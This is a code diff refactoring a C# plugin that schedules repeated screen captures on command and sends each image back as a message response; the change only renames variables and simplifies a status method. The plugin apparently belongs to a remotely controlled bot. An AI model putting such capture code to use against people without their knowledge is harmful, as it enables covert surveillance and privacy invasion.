@@ -9,7 +9,7 @@ namespace Plugins.CapTime
 {
     public class CapTimePlugin : IModule, IJobStatus
     {
-        private IJob<CaptureArgs> worker;
+        private IJob<CaptureArgs> job;
 
         public CapTimePlugin()
         {
@@ -29,37 +29,33 @@ namespace Plugins.CapTime
                 );
 
                 await ResultHandler(result1);
-
-                worker.Stop();
-
+                job.Stop();
                 return;
             }
 
-            var intParams = state.Split(' ');
+            var args = state.Split(' ');
 
-            int duration = Convert.ToInt32(intParams[0]);
-            int interval = Convert.ToInt32(intParams[1]);
+            int duration = Convert.ToInt32(args[0]);
+            int interval = Convert.ToInt32(args[1]);
 
             string text = $"Screen capture has been scheduled to run {duration} sec for every {interval} sec.";
 
-            var response = new Response(text, req.MessageId);
+            var resp = new Response(text, req.MessageId);
 
-            await ResultHandler(response);
+            await ResultHandler(resp);
 
-            ((IScheduled)worker).Start(duration, interval);
+            ((IScheduled)job).Start(duration, interval);
         }
 
         private async void UpdateHandler(object sender, CaptureArgs e)
         {
             var update = new Response(e.Capture.ToMemStream());
-
             await ResultHandler(update);
         }
 
         private async void FeedbackHandler(object sender, Feedback e)
         {
             var result = new Response(e.Text);
-
             await ResultHandler(result);
         }
 
@@ -67,7 +63,7 @@ namespace Plugins.CapTime
         {
             base.Initialize(data);
 
-            worker = new CaptureSchedule
+            job = new CaptureSchedule
             {
                 Update = UpdateHandler,
                 Feedback = FeedbackHandler
@@ -76,14 +72,7 @@ namespace Plugins.CapTime
 
         public string GetStatus()
         {
-            string text = "";
-
-            string name = "Cap Time";
-            bool active = worker.Active;
-
-            text += $"*{name}*: {active.ToReadable()}\n";
-
-            return text.TrimEnd('\n');
+            return $"*Cap Time*: {job.Active.ToReadable()}";
         }
     }
 }
